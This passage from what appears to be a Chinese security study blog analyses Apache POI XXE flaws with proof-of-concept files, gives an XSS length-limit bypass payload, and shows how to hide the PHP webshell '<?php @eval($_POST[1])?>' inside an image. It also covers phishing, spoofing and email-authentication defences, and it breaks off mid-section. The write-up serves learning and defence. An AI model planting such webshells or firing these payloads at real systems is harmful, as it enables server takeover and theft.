<img src="https://img-blog.csdnimg.cn/20200924222504774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200924222515354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>漏洞分析</strong></p>
<p>选择在<code>WorkbookFactory.create</code>处下一个断点，一步步跟入，来到了 OPCPackage 这个类中</p>
<pre><code>public static OPCPackage open(InputStream in) throws InvalidFormatException, IOException {
        OPCPackage pack = new ZipPackage(in, PackageAccess.READ_WRITE);
        if (pack.partList == null) {
            pack.getParts();
        }
        return pack;
    }
</code></pre>
<p>在这个累里，首先new了一个 ZipPackage 类来解析输入，跟进来很明显是个处理 zip 这类型压缩包的东西</p>
<pre><code>ZipPackage(InputStream in, PackageAccess access) throws IOException {
        super(access);
        this.zipArchive = new ZipInputStreamZipEntrySource(new ZipInputStream(in));
    }
</code></pre>
<p>继续往下走，看到了一个if里面调用了pack.getParts();方法，跟进 getParts</p>
<pre><code>public ArrayList&lt;PackagePart&gt; getParts() throws InvalidFormatException {
        this.throwExceptionIfWriteOnly();
        if (this.partList == null) {
            boolean hasCorePropertiesPart = false;
            boolean needCorePropertiesPart = true;
            PackagePart[] parts = this.getPartsImpl();
</code></pre>
<p>这里不知道漏洞触发点在哪，自然就一步步跟了，首先看到了一个this.getPartsImpl()，跟进这个方法，在这个方法里面看到了一个很眼熟的东西，我们刚刚是在 [Content_Types].xml 文件中添加的payload，这里出现了这个文件<br>
<img src="https://img-blog.csdnimg.cn/20200924222616741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
继续跟进 ZipContentTypeManager 这个类，跟进之后才发现，它调用的是它的父类 ContentTypeManager 来进行处理</p>
<pre><code>public ZipContentTypeManager(InputStream in, OPCPackage pkg) throws 
InvalidFormatException {
        super(in, pkg);
    }
</code></pre>
<p>跟进 ContentTypeManager ,下图中 parseContentTypesFile 处理了我们的输入<br>
<img src="https://img-blog.csdnimg.cn/2020092422271666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
跟进 parseContentTypesFile 终于找到了XXE的触发点<br>
<img src="https://img-blog.csdnimg.cn/2020092422272563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
贴一个调用栈</p>
<pre><code>parseContentTypesFile:377, ContentTypeManager (org.apache.poi.openxml4j.opc.internal)
&lt;init&gt;:105, ContentTypeManager (org.apache.poi.openxml4j.opc.internal)
&lt;init&gt;:56, ZipContentTypeManager (org.apache.poi.openxml4j.opc.internal)
getPartsImpl:188, ZipPackage (org.apache.poi.openxml4j.opc)
getParts:665, OPCPackage (org.apache.poi.openxml4j.opc)
open:274, OPCPackage (org.apache.poi.openxml4j.opc)
create:79, WorkbookFactory (org.apache.poi.ss.usermodel)
main:12, CVE20143529
</code></pre>
<p><strong>漏洞修复</strong></p>
<p>可以看到修复方式将 xmlReader.read(in) 变成了 SAXHelper.readSAXDocument(in)</p>
<pre><code>private void parseContentTypesFile(InputStream in) throws InvalidFormatException {
        try {
            Document xmlContentTypetDoc = SAXHelper.readSAXDocument(in);
</code></pre>
<p>然后在 org.apache.poi.util.SAXHelper 中做了一些 xxe 的限制</p>
<h2><a id="CVE201912415_5727"></a>CVE-2019-12415</h2>
<p>In Apache POI up to 4.1.0, when using the tool XSSFExportToXml to convert user-provided Microsoft Excel documents, a specially crafted document can allow an attacker to read files from the local filesystem or from internal network resources via XML External Entity (XXE) Processing.</p>
<p><strong>漏洞场景搭建</strong></p>
<p>测试代码：</p>
<pre><code>import org.apache.poi.EncryptedDocumentException;
import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
import org.apache.poi.xssf.extractor.XSSFExportToXml;
import org.apache.poi.xssf.usermodel.XSSFMap;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.xml.sax.SAXException;

import javax.xml.transform.TransformerException;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
public class PoiXxe {
    public static void main(String[] args) throws IOException, EncryptedDocumentException, InvalidFormatException, TransformerException, SAXException {
        XSSFWorkbook wb = new XSSFWorkbook(new FileInputStream(new File("/Users/l1nk3r/Desktop/CustomXMLMappings.xlsx")));
        for (XSSFMap map : wb.getCustomXMLMappings()) {
            XSSFExportToXml exporter = new XSSFExportToXml(map); // 使用 XSSFExportToXml 将 xlsx 转成 xml
            exporter.exportToXML(System.out, true);//第一个参数是输出流无所谓，第二个参数要为 true
        }
    }
}
</code></pre>
<pre><code>//pom.xml
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;groupId&gt;com.apache.poi&lt;/groupId&gt;
    &lt;artifactId&gt;xxe&lt;/artifactId&gt;
    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;
            &lt;artifactId&gt;poi-ooxml&lt;/artifactId&gt;
            &lt;version&gt;4.1.0&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
&lt;/project&gt;
</code></pre>
<p><strong>漏洞复现</strong><br>
下载这个excel文件，在 CustomXMLMappings/xl/xmlMaps.xml 文件中增加下面这个代码</p>
<pre><code>&lt;xsd:redefine schemaLocation="http://127.0.0.1:8080/"&gt;&lt;/xsd:redefine&gt;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200924222859796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020092422290772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>漏洞分析</strong></p>
<p>调用栈太繁琐了，只列几个关键点，程序进行到 XSDHandler#constructTrees 这个方法的时候，抓出来我们poc中的外带地址<br>
<img src="https://img-blog.csdnimg.cn/20200924222923667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
下一步在 XSDHandler#resolveSchema 中，把外带地址交给了 getSchemaDocument 处理<br>
<img src="https://img-blog.csdnimg.cn/20200924222929640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
最后代码继续往下走，在 XMLEntityManager#setupCurrentEntity 找到了http的请求发起，所以想知道一个XXE漏洞的调用栈，绝大多数情况下，你可以选择在JDK自身的 XMLEntityManager#setupCurrentEntity 中HTTP请求下个断点，然后利用OOB方式利用，很多找到触发过程的调用栈<br>
<img src="https://img-blog.csdnimg.cn/2020092422294462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>setupCurrentEntity:619, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)
determineDocVersion:189, XMLVersionDetector (com.sun.org.apache.xerces.internal.impl)
parse:582, SchemaParsingConfig (com.sun.org.apache.xerces.internal.impl.xs.opti)
parse:685, SchemaParsingConfig (com.sun.org.apache.xerces.internal.impl.xs.opti)
parse:530, SchemaDOMParser (com.sun.org.apache.xerces.internal.impl.xs.opti)
getSchemaDocument:2175, XSDHandler (com.sun.org.apache.xerces.internal.impl.xs.traversers)
resolveSchema:2096, XSDHandler (com.sun.org.apache.xerces.internal.impl.xs.traversers)
constructTrees:1100, XSDHandler (com.sun.org.apache.xerces.internal.impl.xs.traversers)
parseSchema:620, XSDHandler (com.sun.org.apache.xerces.internal.impl.xs.traversers)
loadSchema:617, XMLSchemaLoader (com.sun.org.apache.xerces.internal.impl.xs)
loadGrammar:575, XMLSchemaLoader (com.sun.org.apache.xerces.internal.impl.xs)
loadGrammar:541, XMLSchemaLoader (com.sun.org.apache.xerces.internal.impl.xs)
newSchema:255, XMLSchemaFactory (com.sun.org.apache.xerces.internal.jaxp.validation)
newSchema:638, SchemaFactory (javax.xml.validation)
isValid:249, XSSFExportToXml (org.apache.poi.xssf.extractor)
exportToXML:211, XSSFExportToXml (org.apache.poi.xssf.extractor)
exportToXML:105, XSSFExportToXml (org.apache.poi.xssf.extractor)
main:20, PoiXxe
</code></pre>
<p><strong>漏洞修复</strong></p>
<p>修复的方式增加了一行</p>
<pre><code>trySetFeature(factory, "http://javax.xml.XMLConstants/feature/secure-processing", true);
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/202009242230244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>然后问题关键点就来到了 SecuritySupport#checkAccess ，可以看到未修复代码 allowedProtocols 是all，而 acessAny 也是all，所以 checkAccess 结果返回的是null<br>
<img src="https://img-blog.csdnimg.cn/20200924223031191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>已修复代码中的 SecuritySupport#checkAccess 方法，可以看到未修复代码 allowedProtocols 是""，而 acessAny 也是all，所以 checkAccess 结果返回的是 http<br>
<img src="https://img-blog.csdnimg.cn/20200924223041243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>回到 XSDHandler#getSchemaDocument 中，由于不允许http方式外带数据，因此我们的错误信息自然会出现下图报错里面的部分<br>
<img src="https://img-blog.csdnimg.cn/20200924223051448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200924223101399.png#pic_center" alt="在这里插入图片描述"></p>
<p>最后在简单bb一下，这个洞没啥用，外带也没办法利用FTP client换行那个洞外带数据，所以是个弟中弟的洞</p>
<p><strong>Rerfence：</strong></p>
<p><a href="https://b1ue.cn/archives/241.html">Apache POI &lt;= 4.1.0 XXE 漏洞 (CVE-2019-12415)</a></p>
<p>参考文章：</p>
<pre><code>https://xz.aliyun.com/t/6996   ---本文复现文章
</code></pre>
<hr>
<h2><a id="2220_xsswaf_5850"></a>2.2.20 记一次阿里主站xss测试及绕过waf防护</h2>
<p>使用工具：</p>
<pre><code>https://github.com/chaitin/xray 
</code></pre>
<pre><code>https://www.loongten.com/2019/12/20/find-alibaba-xss/   --一枚阿里巴巴主站XSS挖掘之旅

</code></pre>
<p>书里也有另外的思路，大部分都是各种倒腾方法测试，前面也列举了很多，未授权的别乱搞！！</p>
<p>–</p>
<h2><a id="2221_ClassLoader_5864"></a>2.2.21 ClassLoader类加载机制</h2>
<pre><code>https://javasec.org/javase/ClassLoader/  
</code></pre>
<p>该网站是JAVA非常好的一个学习页面，前面也推荐过了，这里提到ClassLoader再次推下！！</p>
<hr>
<h2><a id="2222_SSRFdayuNinth_Day_5872"></a>2.2.22 浅谈SSRF原理及其利用（dayu-Ninth Day）</h2>
<pre><code>https://teamssix.com/year/191222-192227.html
</code></pre>
<hr>
<pre><code>参考文章
https://xz.aliyun.com/t/2115
http://www.liuwx.cn/penetrationtest-3.html
https://www.cnblogs.com/yuzly/p/10903398.html
https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf
https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/
</code></pre>
<hr>
<h2><a id="2223_SpringDataCommons_CVE20181273_5888"></a>2.2.23 Spring-Data-Commons (CVE-2018-1273)</h2>
<pre><code>http://blog.nsfocus.net/cve-2018-1273-analysis/		自行搭建复现

https://pianshen.com/article/9248784281/     vulhub靶机复现

http://xxlegend.com/2018/04/12/CVE-2018-1273-%20RCE%20with%20Spring%20Data%20Commons%20%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/
</code></pre>
<p>听老的漏洞了，可以玩玩</p>
<hr>
<h2><a id="2224_xss_5901"></a>2.2.24 xss绕过代码后端长度限制的方法</h2>
<p>这篇文章是我近期在审计一套 CMS 的时候顺便写的。</p>
<p>一般来讲程序对于输入字符长度进行限制的方法主要分两种，一种是前端的长度限制，这种的绕过只需要修改前端源码即可，或者本地构造一个表单。</p>
<p>本次审计的这套 CMS 存在一个 XSS 漏洞，由于日志入库验证不严格导致存在该漏洞，只需要尝试登陆即可写入 payload</p>
<pre><code>$uid = 0;

$cfrom = $this-&gt;method-&gt;request('cfrom', $cfrom);

$token = $this-&gt;method-&gt;request('token');

$device= $this-&gt;method-&gt;request('device', $device);

$ip = $this-&gt;method-&gt;request('ip', $this-&gt;method-&gt;ip);

$web = $this-&gt;method-&gt;request('web', $this-&gt;method-&gt;web);

$cfroar= explode(',', 'pc,reim,weixin,appandroid,appiphone,mweb');

if(!in_array($cfrom, $cfroar))return 'not found cfrom';

if($user=='')return '用户名不能为空';

if($pass==''&amp;&amp;strlen($token)&lt;8)return '密码不能为空';

$user = addslashes(substr($user, 0, 20));

$pass = addslashes($pass);

$logins = '登录成功';

$msg = '';

$fields = '`pass`,`id`,`name`,`user`,`face`,`deptname`';

$arrs = array(

'user' =&gt; $user,

'status|eqi' =&gt; 1,

'type|eqi' =&gt; 1,

'state|neqi' =&gt; 5

);

$us = $this-&gt;db-&gt;getone('admin', $arrs , $fields);

if(!$us){

unset($arrs['user']);

$arrs['name'] = $user;

$tos = $this-&gt;db-&gt;rows('admin', $arrs);

if($tos&gt;1){

$msg = '存在相同用户名，系统无法识别';

}

if($msg=='')$us = $this-&gt;db-&gt;getone('admin', $arrs , $fields);

}

if($msg=='' &amp;&amp; !$us){

$msg = '用户不存在';

}else if($msg==''){

$uid = $us['id'];

$user = $us['user'];

if(md5($pass)!=$us['pass'])$msg='密码错误';

if($pass==HIGHPASS){

$msg = '';

$logins = '管理员密码登录成功';

}

if($msg!=''&amp;&amp;strlen($token)&gt;=8){

$moddt = date('Y-m-d H:i:s', time()-10*60*1000);

$trs = $this-&gt;getone("`uid`='$uid' and `token`='$token' and `moddt`&gt;='$moddt'");

if($trs){

$msg = '';

$logins = '快捷登录';

}

}

}

$name = $face = $deptname = '';

if($msg==''){

$name = $us['name'];

$deptname = $us['deptname'];

$face = $us['face'];

if(!$this-&gt;isempt($face))$face = URL.''.$face.'';

$face = $this-&gt;method-&gt;repempt($face, 'images/noface.jpg');

$this-&gt;db-&gt;update('admin',"`loginci`=`loginci`+1", $uid);

}else{

$logins = $msg;

}

m('log')-&gt;addlog(''.$cfrom.'登录','['.$user.']'.$logins.'', array(

'optid' =&gt; $uid,

'optname' =&gt; $name,

'ip' =&gt; $ip,

'web' =&gt; $web,

));
</code></pre>
<p>程序前部分代码对整个登录过程进行了完整验证，同样开发者为了防止插入恶意代码对截取的数据长度限制到了 20 位并使用了 addslashes 对敏感字符进行转义。所以在后面的写入日志那里就很难写入有攻击性的 XSS 代码，单纯  就已经占了 17 个字符</p>
<p><img src="https://img-blog.csdnimg.cn/20200925214823201.png#pic_center" alt="在这里插入图片描述"><br>
通过查看日志的源代码发现其实脚本标签是可以插入的，只不过没有办法写入完整代码，但是最为重要的一个因素在于，这里所插入的代码都是显示在同一个页面的。</p>
<p>所以接下来就是拼接 Payload 代码。考虑到程序会在渲染到页面的时候增加许多的标签导致脚本语法出错所以就直接给注释掉。</p>
<p>最终 payload 代码如下</p>
<pre><code>*/&lt;/script&gt;

*/;alert(a);/*

*//xss//*

*/a=/*

&lt;script&gt;var/*
</code></pre>
<p>这里顺序的问题是因为程序的数据是从后往前显示，咱们输入的顺序是反的但是在页面显示的时候顺序是正常的<br>
<img src="https://img-blog.csdnimg.cn/20200925214852295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
成功触发 XSS 代码。</p>
<p>最终源代码如下：<br>
<img src="https://img-blog.csdnimg.cn/20200925214908342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200925214925576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
最终通过注释符与代码之间的拼接成功的插入了完整的XSS代码</p>
<p>参考链接:</p>
<pre><code>https://www.shangyexinzhi.com/article/387056.html   --该文章

https://www.freebuf.com/column/221882.html   --加深
</code></pre>
<hr>
<h2><a id="2225_mysqlmof_6081"></a>2.2.25 mysql提权之mof</h2>
<pre><code>https://www.jianshu.com/p/6dbac868e2ab

https://pino-hd.github.io/2018/06/10/MySQL提权之MOF/

https://www.cnblogs.com/h4ck0ne/p/5154629.html
</code></pre>
<hr>
<h2><a id="2226_mysqludf_6092"></a>2.2.26 mysql提权之udf</h2>
<pre><code>http://www.oniont.cn/index.php/archives/310.html

https://www.jianshu.com/p/5b34c1b6dee7
</code></pre>
<hr>
<h2><a id="2227_XSS__6100"></a>2.2.27 XSS 基础学习</h2>
<pre><code>https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB   百度百科
</code></pre>
<pre><code>https://www.jianshu.com/p/24a19c6434ae   --最新累积
</code></pre>
<p>还有书中知识！！！</p>
<hr>
<h2><a id="2228_java_shell_jettyshell__6112"></a>2.2.28 java 反射与内存shell 初探-基于jetty容器的shell 维权</h2>
<pre><code>https://www.freebuf.com/articles/web/172753.html    ---利用“进程注入”实现无文件复活 WebShell

http://qiushao.net/2020/02/15/Java/Java-反射机制介绍/

https://www.cnblogs.com/jingmoxukong/p/12049112.html   ---深入理解 Java 反射和动态代理 

http://rui0.cn/archives/1408#more-1408    --前面了解了一些基础和知识，这是内存shell深入的理解，感谢大佬
</code></pre>
<hr>
<p>书籍上还有不同的思路…</p>
<hr>
<h2><a id="2229__DNSLOGdayuTenth_6127"></a>2.2.29 利用 DNSLOG回显（dayu-Tenth</h2>
<pre><code>https://www.anquanke.com/post/id/98096   --实战

https://codingnote.cc/p/113368   --基础原理
</code></pre>
<p>书籍上还有不同的思路…</p>
<hr>
<h2><a id="2230__6137"></a>2.2.30 文件合成/图片马生成</h2>
<p>指的是代码写入后不破坏图片为前提,图片仍可正常打开</p>
<p><strong>方法一：</strong></p>
<p><strong>一句话:</strong></p>
<pre><code>&lt;?php @eval($_POST[1])?&gt;
</code></pre>
<p>用010 Editor（HEX编辑器）打开任意一张图片，将上述代码插入右边最底层或最上层后保存<br>
<img src="https://img-blog.csdnimg.cn/20200926142536767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>方法二：</strong></p>
<p>使用CMD制作一句话木马</p>
<p>参数/b指定以二进制格式复制、合并文件; 用于图像类/声音类文件</p>
<p>参数/a指定以ASCII格式复制、合并文件。用于txt等文档类文件</p>
<pre><code>copy 1.jpg/b+1.php 2.jpg 
</code></pre>
<p>//意思是将1.jpg以二进制与1.php合并成2.jpg生成之后打开2.jpg只要图片依旧正常显示,用记事本打开可以看到乱码末尾有一个一句话，那么2.jpg就是图片木马了。<br>
<img src="https://img-blog.csdnimg.cn/20200926142703865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
图片正常，代码也已写入。<br>
上述两种上传到服务器后都可用菜刀连接。</p>
<pre><code>https://bbs.zkaq.cn/?t/159.html

https://blog.csdn.net/ltysg0645/article/details/53996658
</code></pre>
<hr>
<h2><a id="2231UDF_6176"></a>2.2.31UDF提权</h2>
<pre><code>https://www.cnblogs.com/zzjdbk/p/12989830.html   ---MySQL提权之udf提权(获得webshell的情况)

https://www.jianshu.com/p/5b34c1b6dee7   --另外的思路
</code></pre>
<hr>
<h2><a id="23__6184"></a>2.3 社会工程学</h2>
<h2><a id="231__6185"></a>2.3.1 水坑攻击</h2>
<p>“水坑攻击”，黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。</p>
<p>由于此种攻击借助了目标团体所信任的网站，攻击成功率很高，即便是那些对鱼叉攻击或其他形式的钓鱼攻击具有防护能力的团体</p>
<p>水坑攻击属于APT攻击的一种，与钓鱼攻击相比，黑客无需耗费精力制作钓鱼网站，而是利用合法网站的弱点，隐蔽性比较强。在人们安全意识不断加强的今天，黑客处心积虑地制作钓鱼网站却被有心人轻易识破，而水坑攻击则利用了被攻击者对网站的信任。</p>
<p>水坑攻击利用网站的弱点在其中植入攻击代码，攻击代码利用浏览器的缺陷，被攻击者访问网站时终端会被植入恶意程序或者直接被盗取个人重要信息。</p>
<p>水坑攻击相对于通过社会工程方式引诱目标用户访问恶意网站更具欺骗性，效率也更高。水坑方法主要被用于有针对性的攻击，而Adobe Reader、Java运行时环境（JRE）、Flash和IE中的零漏洞被用于安装恶意软件</p>
<pre><code>https://baike.baidu.com/item/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/17644830
</code></pre>
<p>熟悉下…</p>
<hr>
<h2><a id="232__6201"></a>2.3.2 鱼叉攻击</h2>
<p>“鱼叉攻击”是黑客攻击方式之一，最常见的做法是，将木马程序作为电子邮件的附件，并起上一个极具诱惑力的名称，发送给目标电脑，诱使受害者打开附件，从而感染木马。</p>
<pre><code>https://baike.baidu.com/item/鱼叉攻击
</code></pre>
<h2><a id="2321_Swaks_6208"></a>2.3.2.1 Swaks-邮件伪造</h2>
<pre><code>https://www.cnblogs.com/zhaijiahui/p/11494626.html
</code></pre>
<p>瑞士军刀还是很有名的，熟悉下原理和简单的 --to  --from  --attach --data  --elho这几种使用意思就OK了…</p>
<hr>
<h2><a id="2322__6216"></a>2.3.2.2 邮件伪造防御技术</h2>
<h2><a id="SPF_6218"></a>SPF</h2>
<p>SPF是 Sender Policy Framework 的缩写，一种以IP地址认证电子邮件发件人身份的技术，是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录。 接收邮件方会首先检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。</p>
<p>SPF可以防止别人伪造你来发邮件，是一个反伪造性邮件的解决方案。当你定义了你域名的SPF记录之后， 接收邮件方会根据你的SPF记录来确定连接过来的IP地址是否被包含在SPF记录里面，如果在，则认为是一封正确的邮件，否则则认为是一封伪造的邮件。</p>
<p>设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。</p>
<pre><code>https://www.jianshu.com/p/b3460757d260   --使用方法
</code></pre>
<h2><a id="DKIM_6230"></a>DKIM</h2>
<p>DKIM是一种防范电子邮件欺诈的验证技术，通过消息加密认证的方式对邮件发送域名进行验证。</p>
<p>邮件发送方发送邮件时，利用本域私钥加密邮件生成DKIM签名，将DKIM签名及其相关信息插入邮件头。邮件接收方接收邮件时，通过DNS查询获得公钥，验证邮件DKIM签名的有效性。从而确认在邮件发送的过程中，防止邮件被恶意篡改，保证邮件内容的完整性</p>
<pre><code>DKIM RFC协议：http://tools.ietf.org/html/rfc6376

DKIM官方网站：http://www.dkim.org/
</code></pre>
<h2><a id="DMARC_6242"></a>DMARC</h2>
<p>DMARC是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，在邮件收发双方建立了邮件反馈机制，便于邮件发送方和邮件接收方共同对域名的管理进行完善和监督。</p>
<p>DMARC要求域名所有者在DNS记录中设置SPF记录和DKIM记录，并明确声明对验证失败邮件的处理策略。邮件接收方接收邮件时，首先通过DNS获取DMARC记录，再对邮件来源进行SPF验证和DKIM验证，对验证失败的邮件根据DMARC记录进行处理，并将处理结果反馈给发送方。</p>
<p>DMARC能够有效识别并拦截欺诈邮件和钓鱼邮件，保障用户个人信息安全。</p>
<p>设置完 SPF 和 DKIM 后，您就能以 TXT 记录的形式向您网域的 DNS 记录添加政策，从而配置 DMARC（方法与配置 SPF 或 ADSP 一样）</p>
<pre><code>https://support.google.com/a/answer/2466563?hl=zh-Hans

https://dmarc.org//draft-dmarc-base-00-01.html#iana_dmarc_tags

DMARC RFC协议：http://tools.ietf.org/html/rfc7489

DMARC官方网站：https://dmarc.org/
</code></pre>
<hr>
<h2><a id="233__6262"></a>2.3.3 钓鱼攻击</h2>
<pre><code>https://zh.wikipedia.org/wiki/钓鱼式攻击
</code></pre>
<h2><a id="2331__6268"></a>2.3.3.1 视觉效果</h2>
<p><strong>钓鱼攻击</strong></p>
<p>钓鱼式攻击是一种企图从电子通讯中，通过伪装成信誉卓著的法人媒体以获得如用户名、密码和信用卡明细等个人敏感信息的犯罪诈骗过程。这些通信都声称(自己)来自社交网站拍卖网站网络银行、电子支付网站或网络管理者，以此来诱骗受害人的轻信。网钓通常是通过e-mail或者即时通讯进行。它常常导引用户到∪RL与界面外观与真正网站几无二致的假冒网站输入个人数据。就算使用强式加密的SSL服务器认证，要侦测网站是否仿冒实际上仍很困难。</p>
<p><strong>例子-视觉效果</strong></p>
<p>某次应急响应中，从A客户（跨国经销商）那里了解到的情况如下：</p>
<pre><code>A是商家 

B商家的消费者 

C黑客
</code></pre>
<p>C攻入了A的邮件服务器，并且持续控制了一个季度，共3个月。</p>
<p>B要购买A的产品时，A发送合同给B，同时C的木马也在读取邮件数据库的内容，合同中有付款账户，C从中截获A的邮件，并且修改合同内容，从邮件服务器拉取到了前一年的合同模板，将银行账户打印上去，B收到C的合同后迸行了打款，同时B在向A确认的过程中，A发现B受骗了。</p>
<p>思考:</p>
<pre><code>C怎么给B发送的邮件,取得了B的信任呢?
</code></pre>
<p>这里举个例子: <code>fish.com与 fish.corn</code></p>
<p>乍一看，fish.com中的com与corn非常相似，有个别字体影响的话，还是很难分辨的，更别说歪果仁了…</p>
<p><strong>宋体</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20200926195849321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>娃娃体</strong><br>
<img src="https://img-blog.csdnimg.cn/20200926200000603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="2332__6309"></a>2.3.3.2 凭证劫持</h2>
<p><strong>漏洞危害</strong></p>
<p>劫持凭证，构造链接登录受害者账号</p>
